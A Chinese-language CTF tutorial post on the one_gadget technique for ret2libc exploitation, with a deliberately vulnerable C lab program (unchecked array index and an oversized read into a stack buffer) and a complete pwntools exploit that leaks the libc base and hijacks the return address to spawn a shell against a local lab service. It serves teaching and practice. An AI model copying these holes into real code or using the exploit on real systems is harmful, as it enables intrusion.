---
title: "Day14－Other ret2libc(one gadgets)"
date: 2024-09-28
draft: false
tags: ["iron-man-2024", "pwn", "2024"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## [Lab 網址](https://github.com/YJK0805/PWN-CTF-note/)


## 前言

昨天的內容利用了 `libc` 進行攻擊，不過實際上我們使用的 gadgets 長度既不算長也不算短。而且在之前的題目中，我們常常隨意填充 `rbp`，那麼 `rbp` 真的沒有用嗎？事實上，它是有作用的。像是 [one gadget](https://github.com/david942j/one_gadget) 這個工具，就會使用到 `rbp`，而且它能使 gadgets 的長度最短，因為它只需要控制 `rbp` 和 8 個 byte 的 return address 即可。

## [One Gadget](https://github.com/david942j/one_gadget)

在函式庫中，有些函式會呼叫 `execve('/bin/sh', argv, envp)`，簡單來說就是可以拿來開啟 shell。像是 `system(cmd)` 可能會執行 `fork() + execve('/bin/sh', ["sh","-c",cmd], environ)`。因此，如果跳到 `system` 的某個中段，最終可能會執行 `execve('/bin/sh', argv, environ)`。

不過，雖然這樣說，直接跳過去不一定會成功，但通常有很多個 one gadget，所以多試幾個總會有成功的可能。如果你想進一步了解工具的運作方式，或者想手動尋找 one gadget，建議參考 david942j 在 HITCON CMT 2017 的議程 [david942j - 一發入魂 One Gadget RCE](https://youtu.be/L9maBmiJGAc?si=1eEG5bjKVoFp37gv)。

## 使用

使用以下指令安裝 one gadget 工具：

```bash
gem install one_gadget
```
安裝完成後，只需要針對 libc 找出可用的 one gadget，指令如下：

```bash
one_gadget <libc file>
```

![image](/images/iron2024/day14_image1.png)

可以看到工具會列出各個 gadget 的限制條件，因此需要滿足這些條件，像是 `rbp` 的值或其他 register 的位置。通常我不會過於在意這些限制條件，只要 `rbp` 符合條件即可，比如符合 `rbp-0x78`、`rbp-0x48` 或 `rbp-0x50` 是可寫的。

我的習慣是使用 `gdb` 將程式運行起來，然後通過 `vmmap` 查看哪些區域是可寫的。找到沒有寫入資料的區段後，將 `rbp` 設置為那個區段的位址。接著，如果失敗，就換另一個 gadget 繼續測試。

## Lab

查看以下原始碼：

```c
#include<stdio.h>
#include<stdlib.h>

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    long long num[10] = {0};
    while(1){
        puts("1. Edit number");
        puts("2. Show number");
        puts("3. Exit");
        printf(">> ");
        int choice;
        scanf("%d", &choice);
        switch(choice){
            case 1:
                printf("Index: ");
                int idx;
                scanf("%d", &idx);
                printf("Number: ");
                scanf("%lld", &num[idx]);
                break;
            case 2:
                printf("Index: ");
                int idx2;
                scanf("%d", &idx2);
                printf("Number: %lld\n", num[idx2]);
                break;
            case 3:
                break;
            default:
                puts("Invalid choice");
                break;
        }
        if(choice == 3){
            break;
        }
    }
    char message[0x20];
    printf("Leave a message: ");
    read(0, message, 0x80);
    return 0;
}
```

使用以下指令進行編譯：

```bash
gcc src/ret2libc_adv.c -o ./ret2libc_adv/share/ret2libc_adv -fno-stack-protector
```

## writeup

相比昨天的 Lab，這次的 `read` 可以 overflow 的部分變小了，但其餘部分相同，仍然可以通過越界讀取來 leak `libc base`。查看反組譯碼會發現能 overflow 的位置只有到 `rbp` 和 return address，因此非常適合使用 one gadget。

![image](/images/iron2024/day14_image2.png)

使用 one gadget 找到的 gadget 如下：

![image](/images/iron2024/day14_image3.png)

接下來，我們寫一個簡單的 script 來確認條件，看看能使用哪個 gadget。在測試之前，記得依照昨天的方式換 `libc`，指令如下：

```bash
patchelf --replace-needed libc.so.6 ./libc.so.6 --set-interpreter ./ld-linux-x86-64.so.2 ./ret2libc_adv
```

然後寫測試的 script 並掛上 `gdb`：

```python
from pwn import *

r = process('./ret2libc_adv')
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(r)
r.sendlineafter('>> ', '2')
r.sendlineafter('Index: ', '11')
number = int(r.recvline().strip().split(b': ')[1])
libc_base = number - 0x29d90
log.info(f'Libc: {hex(libc_base)}')
payload = b'A' * 0x70
r.sendlineafter('>> ', '3')
r.sendlineafter('Leave a message: ', payload)

r.interactive()
```

執行後，在 return address 觀察 `register` 的狀態以及應該填充的 `rbp` 值：

![image](/images/iron2024/day14_image4.png)

既然我們已經有了 `libc base address`，就可以查看 `libc` 的可寫段：

![image](/images/iron2024/day14_image5.png)

我通常習慣從最尾端找起，使用指令 `x/30gx 0x7f83a8e81000-0x78`，發現大多區域都是可寫的。

![image](/images/iron2024/day14_image6.png)

回到剛才找到的 one gadget，最後一個 gadget 的 offset 是 `0xebd43`，看起來條件符合。我們將 `rbp` 填入之前找到的可寫區段（記得加上 offset 和 `libc address`）。

![image](/images/iron2024/day14_image7.png)

完整 exploit：

```python
from pwn import *

# r = process('./ret2libc_adv')
r = remote('127.0.0.1', 10006)
r.sendlineafter('>> ', '2')
r.sendlineafter('Index: ', '11')
number = int(r.recvline().strip().split(b': ')[1])
libc_base = number - 0x29d90
log.info(f'Libc: {hex(libc_base)}')
rbp = libc_base + 0x21c000
one_gadget = libc_base + 0xebd43
payload = b'A' * 0x70 + p64(rbp) + p64(one_gadget)
r.sendlineafter('>> ', '3')
r.sendlineafter('Leave a message: ', payload)
r.interactive()
```

solved！！

![image](/images/iron2024/day14_image8.png)